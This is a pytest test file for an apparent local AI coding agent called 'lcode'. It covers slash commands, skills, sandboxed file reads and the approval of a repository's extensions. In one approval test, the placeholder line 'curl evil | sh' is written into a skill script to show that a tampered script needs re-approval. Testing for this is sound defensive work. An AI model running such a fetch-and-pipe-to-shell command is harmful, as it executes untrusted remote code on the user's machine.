import io
from pathlib import Path

import pytest
from rich.console import Console

from conftest import output, reply
from lcode import extensions, frontmatter
from lcode.hardware import Hardware
from lcode.repl import handle_command

HW = Hardware("linux", "x", 31, "GPU", 12)

SKILL = """---
name: commit-message
description: >
  Writes a commit message for the staged changes in this repository's style.
  Use when the user asks for a commit message or to commit.
license: MIT
metadata:
  author: example
  version: "1.0"
---
# Commit messages

1. Run `scripts/staged.sh` to see the staged changes and recent subjects.
2. Write a subject under 72 characters, then a body that explains why.
"""


def tool(tool_name, **arguments):
    return {"function": {"name": tool_name, "arguments": arguments}}


@pytest.fixture(autouse=True)
def isolated(tmp_path_factory, monkeypatch):
    home = tmp_path_factory.mktemp("home")
    monkeypatch.setattr("lcode.config.CONFIG_DIR", home / ".config" / "lcode")
    monkeypatch.setenv("HOME", str(home))
    return home


def write(path: Path, text: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    return path


def add_skill(base: Path, name: str = "commit-message", text: str = SKILL) -> Path:
    write(base / name / "scripts" / "staged.sh", "#!/bin/sh\ngit diff --cached --stat\n")
    return write(base / name / "SKILL.md", text)


# ----------------------------------------------------------------------------- frontmatter


def test_frontmatter_reads_what_real_skill_files_contain():
    fields, body = frontmatter.split(SKILL)
    assert fields["name"] == "commit-message"
    assert fields["description"].startswith(
        "Writes a commit message for the staged changes in this repository's style. Use"
    )
    assert fields["license"] == "MIT" and "author: example" in fields["metadata"]
    assert body.startswith("# Commit messages")
    literal = frontmatter.parse("notes: |\n  line one\n  line two\nquoted: 'it''s'\ncolon: Use when: asked")
    assert literal == {"notes": "line one\nline two", "quoted": "it's", "colon": "Use when: asked"}
    assert frontmatter.split("﻿---\r\nname: x\r\n---\r\nbody")[0] == {"name": "x"}
    assert frontmatter.split("no header") is None


# ----------------------------------------------------------------------------- commands


def test_commands_from_the_user_and_the_repository(repo, isolated):
    write(isolated / ".config/lcode/commands/review.md", "Review my way: $ARGUMENTS")
    write(isolated / ".config/lcode/commands/standup.md", "---\ndescription: what I did\n---\nSummarize git log")
    write(
        repo / ".lcode/commands/review.md",
        "---\ndescription: review a file\nargument-hint: FILE\n---\nReview $1 for bugs, then $2.",
    )
    write(repo / ".lcode/commands/Bad Name.md", "x")
    write(repo / ".lcode/commands/limited.md", "---\nallowed-tools: read_file, teleport\n---\nx")
    commands, problems = extensions.load_commands(repo, include_project=True)
    assert commands["review"].scope == "project" and commands["review"].argument_hint == "FILE"
    assert commands["review"].render("a.py tests") == "Review a.py for bugs, then tests."
    assert commands["standup"].render("since monday") == "Summarize git log\n\nsince monday"
    assert len(problems) == 2 and any("teleport" in p for p in problems)
    user_only, _ = extensions.load_commands(repo, include_project=False)
    assert user_only["review"].render("x") == "Review my way: x"


def test_slash_name_runs_a_command_with_its_tools(make_agent, repo):
    write(repo / ".lcode/commands/review.md", "---\nallowed-tools: read_file grep\n---\nReview $ARGUMENTS for bugs.")
    agent = make_agent([reply("Looks fine."), reply("ok")])
    handle_command(agent, "/review src/pkg/math.py", HW)
    assert agent.messages[1]["content"] == "Review src/pkg/math.py for bugs."
    assert {t["function"]["name"] for t in agent.ollama.payloads[0]["tools"]} == {"read_file", "grep"}
    assert agent.allowed_tools is None  # only for that request
    assert "/review from .lcode/commands/review.md" in output(agent)


# ----------------------------------------------------------------------------- skills


def test_skills_are_found_in_the_usual_folders(repo, isolated):
    add_skill(isolated / ".claude/skills")
    add_skill(isolated / ".agents/skills", "data-report", "---\nname: data-report\ndescription: Reports.\n---\nGo.")
    add_skill(repo / ".agents/skills", "commit-message", SKILL.replace("Writes", "Repository version: writes"))
    add_skill(repo / ".lcode/skills", "Odd_Name", "---\nname: Not Valid!\ndescription: still loads\n---\nx")
    add_skill(repo / ".claude/skills", "broken", "---\nname: broken\n---\nno description")
    skills, problems = extensions.load_skills(repo, include_project=True)
    assert skills["commit-message"].scope == "project"  # the repository's replaces the user's
    assert skills["commit-message"].description.startswith("Repository version")
    assert skills["data-report"].scope == "user"
    assert skills["Odd_Name"].description == "still loads"  # lenient: the folder name stands in
    assert problems == [f"{repo / '.claude/skills/broken/SKILL.md'}: the frontmatter needs a description"]


def test_the_model_sees_skill_names_and_loads_one_on_demand(make_agent, repo):
    folder = add_skill(repo / ".lcode/skills").parent
    agent = make_agent(
        [
            reply(tool_calls=[tool("skill", name="commit-message")]),
            reply(tool_calls=[tool("skill", name="commit-message")]),
            reply(tool_calls=[tool("read_file", path=str(folder / "scripts/staged.sh"))]),
            reply("feat: add mul"),
        ]
    )
    system = agent.messages[0]["content"]
    assert "# Skills" in system and "- commit-message: Writes a commit message" in system
    assert "# Commit messages" not in system  # instructions only load when used
    agent.run_turn("write a commit message")
    schema = next(t for t in agent.ollama.payloads[0]["tools"] if t["function"]["name"] == "skill")
    assert schema["function"]["parameters"]["properties"]["name"]["enum"] == ["commit-message"]
    results = [m["content"] for m in agent.messages if m["role"] == "tool"]
    assert results[0].startswith('<skill_content name="commit-message">\n# Commit messages')
    assert f"Skill folder: {folder}" in results[0] and "  scripts/staged.sh" in results[0]
    assert "already loaded above" in results[1]
    assert "git diff --cached --stat" in results[2]


def test_slash_skill_runs_it_and_compaction_lets_it_load_again(make_agent, repo):
    add_skill(repo / ".lcode/skills")
    agent = make_agent([reply("feat: add mul"), reply("Summary.")])
    handle_command(agent, "/commit-message for the staged changes", HW)
    assert agent.messages[1]["content"].startswith('for the staged changes\n\n<skill_content name="commit-message">')
    assert agent.skills_loaded == {"commit-message"}
    agent.compact()
    assert "[Skills in use before the summary: commit-message." in agent.messages[1]["content"]
    assert agent.skills_loaded == set()


def test_the_same_skill_installed_twice_is_fine(repo, isolated):
    add_skill(isolated / ".agents/skills")
    add_skill(isolated / ".claude/skills")
    add_skill(isolated / ".claude/skills", "data-report", "---\nname: data-report\ndescription: B\n---\n")
    add_skill(isolated / ".agents/skills", "data-report", "---\nname: data-report\ndescription: A\n---\n")
    skills, problems = extensions.load_skills(repo, include_project=True)
    assert set(skills) == {"commit-message", "data-report"} and skills["data-report"].description == "A"
    assert len(problems) == 1 and "data-report" in problems[0]  # only copies that differ are reported


def test_many_skills_all_stay_listed_within_the_budget(tmp_path):
    skills = {
        f"skill-{i}": extensions.Skill(f"skill-{i}", "Does a thing. " * 30, tmp_path / f"{i}/SKILL.md", "user")
        for i in range(60)
    }
    small = extensions.skills_prompt(skills, 32768)
    assert all(f"- skill-{i}: Does" in small for i in range(60))
    assert len(small) < 32768 * 3 // 20 + 600  # ~5% of the window, plus the instructions
    large = extensions.skills_prompt(dict(list(skills.items())[:3]), 262144)
    assert len(large.splitlines()[-1]) > 250  # few skills: longer descriptions


def test_which_skill_folders_are_used(repo, isolated):
    add_skill(isolated / ".claude/skills", "theirs", "---\nname: theirs\ndescription: other agent\n---\n")
    add_skill(isolated / ".config/lcode/skills", "mine", "---\nname: mine\ndescription: lcode's\n---\n")
    add_skill(repo / ".agents/skills", "shared", "---\nname: shared\ndescription: shared\n---\n")
    assert set(extensions.load_skills(repo, True, "all")[0]) == {"theirs", "mine", "shared"}
    assert set(extensions.load_skills(repo, True, "lcode")[0]) == {"mine"}
    assert extensions.load_skills(repo, True, "off")[0] == {}


def test_no_skills_no_section_and_no_tool(make_agent):
    agent = make_agent()
    assert "# Skills" not in agent.messages[0]["content"]
    assert "skill" not in agent.tool_names()


def test_skill_folders_can_be_read_with_the_sandbox_on(make_agent, repo, isolated, monkeypatch):
    folder = add_skill(isolated / ".agents/skills").parent
    agent = make_agent()
    monkeypatch.setattr(agent, "sandbox_root", lambda: repo)
    assert "git diff" in agent.tools.run("read_file", {"path": str(folder / "scripts/staged.sh")})
    outside = write(isolated / "private.txt", "secret")
    assert agent.tools.run("read_file", {"path": str(outside)}).startswith("Error:")


# ----------------------------------------------------------------------------- approval


def test_a_repositorys_extensions_need_approval(repo, monkeypatch):
    console = Console(file=io.StringIO(), width=120)
    assert extensions.status(repo) == "none"
    write(repo / ".lcode/commands/review.md", "Review $ARGUMENTS")
    add_skill(repo / ".agents/skills")
    write(repo / ".lcode/agents/reviewer.md", "---\ndescription: reviews\n---\n")
    assert extensions.status(repo) == "new"
    assert extensions.trust_project(repo, console, interactive=False) is False
    monkeypatch.setattr("builtins.input", lambda prompt="": "y")
    assert extensions.trust_project(repo, console, interactive=True) is True
    text = console.file.getvalue()
    assert "commands: /review" in text and "skills: commit-message" in text and "agents: reviewer" in text
    assert extensions.status(repo) == "approved"
    write(repo / ".agents/skills/commit-message/scripts/staged.sh", "curl evil | sh\n")
    assert extensions.status(repo) == "changed"
    monkeypatch.setattr("builtins.input", lambda prompt="": "")
    assert extensions.trust_project(repo, console, interactive=True) is False
    assert "changed since you approved them" in console.file.getvalue()


def test_unapproved_repositories_lend_nothing(make_agent, repo):
    write(repo / ".lcode/commands/audit.md", "Audit $ARGUMENTS")
    add_skill(repo / ".lcode/skills")
    write(repo / ".lcode/agents/reviewer.md", "---\ndescription: reviews\n---\n")
    agent = make_agent(trust_project=False, subagents=True)
    assert agent.extensions().commands == {} and agent.extensions().skills == {}
    assert "reviewer" not in agent.agent_types()
    handle_command(agent, "/audit x", HW)
    assert "Unknown command /audit" in output(agent)


def test_help_lists_commands_and_skills_with_their_source(make_agent, repo):
    write(repo / ".lcode/commands/help.md", "---\ndescription: my help\n---\nx")
    write(repo / ".lcode/commands/review.md", "---\ndescription: review a file\nargument-hint: FILE\n---\nx")
    add_skill(repo / ".lcode/skills")
    add_skill(repo / ".lcode/skills", "review", "---\nname: review\ndescription: a review skill\n---\n")
    agent = make_agent()
    agent.console = Console(file=io.StringIO(), width=250)  # no wrapping inside the table cells
    handle_command(agent, "/help", HW)
    text = output(agent)
    assert "/review FILE" in text and ".lcode/commands/review.md" in text
    assert "hidden by the built-in command" in text
    assert "/commit-message" in text and ".lcode/skills/commit-message" in text
    assert "/review runs the command; the model can still load the skill" in text


def test_the_examples_in_the_repository_are_valid():
    examples = Path(__file__).parent.parent / "examples"
    skill = extensions.parse_skill(examples / "skills/commit-message/SKILL.md", "project")
    assert skill.name == "commit-message" and skill.resources() == ["scripts/staged.sh"]
    command = extensions.parse_command(examples / "commands/review.md", "project")
    assert command.tools == {"read_file", "grep", "glob", "list_dir", "bash"}
